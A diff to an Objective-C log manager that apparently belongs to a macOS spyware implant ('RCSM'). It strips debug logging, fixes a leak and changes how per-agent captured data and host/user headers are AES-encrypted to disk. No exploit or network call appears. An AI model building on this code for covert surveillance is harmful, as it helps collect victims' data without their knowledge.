@@ -106,12 +106,6 @@ static RCSMLogManager *sharedLogManager = nil;
   else
     logRawHeader->additionalDataLength = 0;
 
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"hiTimestamp: %x", logRawHeader->hiTimestamp);
-  infoLog(@"loTimestamp: %x", logRawHeader->loTimestamp);
-  infoLog(@"logHeader: %@", logHeader);
-#endif
-  
   int headerLength = sizeof(logStruct)
                       + logRawHeader->deviceIdLength
                       + logRawHeader->userIdLength
@@ -120,57 +114,33 @@ static RCSMLogManager *sharedLogManager = nil;
   
   int paddedLength = headerLength;
 
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"unpaddedLength: %d", paddedLength);
-#endif
-  
   if (paddedLength % kCCBlockSizeAES128)
     {
       int pad = (paddedLength + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - paddedLength;
       paddedLength += pad;
-
-      /*
-      paddedLength >> 4;
-      paddedLength++;
-      paddedLength << 4;
-      */
     }
-  
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"paddedLength: %d", paddedLength);
-#endif
-  
+
   paddedLength += sizeof(int);
   
   if (paddedLength < headerLength)
-    return nil;
-  
+    {
+      [logHeader release];
+      [outerPool release];
+      return nil;
+    }
+    
   NSMutableData *rawHeader = [[NSMutableData alloc] initWithCapacity: [logHeader length]
                               + [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                               + [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                               + [anAgentHeader length]];
   
-  //
   // Clear dword at the start of the file which specifies the size of the
   // unencrypted data
-  //
   headerLength = paddedLength - sizeof(int);
-
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"headerLength: %d", headerLength);
-#endif
 
   [rawHeader appendData: logHeader];
   [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
   [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"logHeader: %@", logHeader);
-  infoLog(@"hostName: %@", hostName);
-  infoLog(@"userName: %@", userName);
-  infoLog(@"rawHeader: %@", rawHeader);
-  infoLog(@"anAgentHeader: %@", anAgentHeader);
-#endif
 
   [hostName release];
   [logHeader release];
@@ -178,23 +148,14 @@ static RCSMLogManager *sharedLogManager = nil;
   if (anAgentHeader != nil)
     [rawHeader appendData: anAgentHeader];
 
-//#ifdef DEV_MODE
-//  unsigned char tmp[CC_MD5_DIGEST_LENGTH];
-//  CC_MD5(gLogAesKey, strlen(gLogAesKey), tmp);
-//  
-//  NSData *temp = [[NSData alloc] initWithBytes: tmp
-//                                        length: CC_MD5_DIGEST_LENGTH];
-//#else
   NSData *temp = [[NSData alloc] initWithBytes: gLogAesKey
                                         length: CC_MD5_DIGEST_LENGTH];
-//#endif
   
-#ifdef DEBUG_LOG_MANAGER  
-  infoLog(@"rawHeader Size before Encryption: %d", [rawHeader length]);
-#endif
   CCCryptorStatus result = 0;
   
-  result = [rawHeader encryptWithKey: temp];
+  // no padding on aligned blocks
+  result = [rawHeader __encryptWithKey: temp];
+  
   [temp release];
   
   if (result == kCCSuccess)
@@ -202,27 +163,14 @@ static RCSMLogManager *sharedLogManager = nil;
       NSMutableData *header = [[NSMutableData alloc] initWithCapacity: headerLength + sizeof(int)];
       [header appendBytes: &headerLength length: sizeof(headerLength)];
       [header appendData: rawHeader];
-      
-#ifdef DEBUG_LOG_MANAGER      
-      infoLog(@"rawHeader Size after Encryption: %d", [rawHeader length]);
-      infoLog(@"headerLength: %x", headerLength);
-#endif
-      
-      
+          
       [rawHeader release];
       [outerPool release];
       
       return [header autorelease];
     }
-  else
-    {
-#ifdef DEBUG_LOG_MANAGER
-      infoLog(@"Error on encryption: %d", result);
-#endif
-    }
   
-  [outerPool release];
-  
+  [outerPool release];  
   return nil;
 }
 
@@ -763,10 +711,6 @@ static RCSMLogManager *sharedLogManager = nil;
               forAgent: (u_int)agentID
              withLogID: (u_int)logID
 {
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"Saving data for agent (%04x) logID (0x%x)", agentID, logID);
-#endif
-  
   BOOL logFound = FALSE;
   
   [gActiveQueueLock lock];
@@ -777,28 +721,16 @@ static RCSMLogManager *sharedLogManager = nil;
   
   while (anObject = [enumerator nextObject])
     {
-      //[anObject retain];
-      
       if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
           && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
         {
           logFound = TRUE;
           
-          //[logLock lock];
           NSFileHandle *logHandle = [anObject objectForKey: @"handle"];
-          //[logLock unlock];
-          
-//#ifdef DEV_MODE
-//          unsigned char tmp[CC_MD5_DIGEST_LENGTH];
-//          CC_MD5(gLogAesKey, strlen(gLogAesKey), tmp);
-//          
-//          NSData *temp = [NSData dataWithBytes: tmp
-//                                        length: CC_MD5_DIGEST_LENGTH];
-//#else
+
           NSData *temp = [NSData dataWithBytes: gLogAesKey
                                         length: CC_MD5_DIGEST_LENGTH];
-//#endif
-          
+                                        
           int _blockSize = [aData length];
           NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                              length: sizeof(int)];
@@ -810,14 +742,10 @@ static RCSMLogManager *sharedLogManager = nil;
 #endif
           
           CCCryptorStatus result = 0;
-          result = [aData encryptWithKey: temp];
+          result = [aData __encryptWithKey: temp];
           
           if (result == kCCSuccess)
             {
-#ifdef DEBUG_LOG_MANAGER
-              infoLog(@"logData Encrypted correctly");
-#endif
-              
               // Writing the size of the clear text block
               [logHandle writeData: blockSize];
               // then our log data
@@ -827,12 +755,6 @@ static RCSMLogManager *sharedLogManager = nil;
               [[RCSMDiskQuota sharedInstance] incUsed: [aData length] + sizeof(blockSize)];
               
               break;
-            }
-          else
-            {
-#ifdef DEBUG_LOG_MANAGER
-              infoLog(@"An error occurred while encrypting log data");
-#endif
             }
         }
     }
@@ -849,9 +771,6 @@ static RCSMLogManager *sharedLogManager = nil;
   //
   if (logFound == FALSE)
     {
-#ifdef DEBUG_LOG_MANAGER
-      infoLog(@"Log not found");
-#endif
       return FALSE;
     }
   
